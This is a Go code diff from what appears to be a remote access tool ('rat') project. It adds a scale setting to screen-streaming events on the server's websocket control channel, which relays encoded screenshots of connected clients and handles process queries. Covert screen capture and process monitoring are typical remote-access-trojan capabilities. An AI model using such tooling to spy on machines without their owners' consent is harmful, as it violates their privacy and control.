@@ -6,6 +6,8 @@ import (
 	"rat/common"
 	"time"
 
+	"encoding/json"
+
 	"golang.org/x/net/websocket"
 )
 
@@ -18,6 +20,11 @@ type Event struct {
 	Event    int
 	ClientId int
 	Data     string
+}
+
+type ScreenEvent struct {
+	Activate bool
+	Scale    float32
 }
 
 func newEvent(event int, clientID int, data string) *Event {
@@ -45,14 +52,26 @@ func incomingWebSocket(ws *websocket.Conn) {
 		client := get(event.ClientId)
 
 		if event.Event == ScreenUpdateEvent {
-			stream := event.Data == "true"
-			packet := ScreenPacket{stream}
+			var screenEvent ScreenEvent
+			err := json.Unmarshal([]byte(event.Data), &screenEvent)
+
+			if err != nil {
+				fmt.Println("json:", err.Error())
+			}
+
+			stream := screenEvent.Activate
+			scale := screenEvent.Scale
+
+			packet := ScreenPacket{stream, scale}
 			client.Queue <- packet
 
-			client.StreamingScreen = stream
-			go ScreenStream(client, ws)
+			if !client.Screen.Streaming {
+				go ScreenStream(client, ws)
+			}
+
+			client.Screen.Streaming = stream
 			defer func() {
-				client.StreamingScreen = false
+				client.Screen.Streaming = false
 			}()
 		} else if event.Event == ProcessQueryEvent {
 			client.Listeners[common.ProcessHeader] = ws
@@ -67,7 +86,7 @@ func InitControlSocket() {
 
 // ScreenStream streams screen to websocket
 func ScreenStream(client *Client, ws *websocket.Conn) {
-	for client.StreamingScreen {
+	for client.Screen.Streaming {
 		event := newEvent(ScreenUpdateEvent, client.Id, client.GetEncodedScreen())
 
 		err := websocket.JSON.Send(ws, &event)
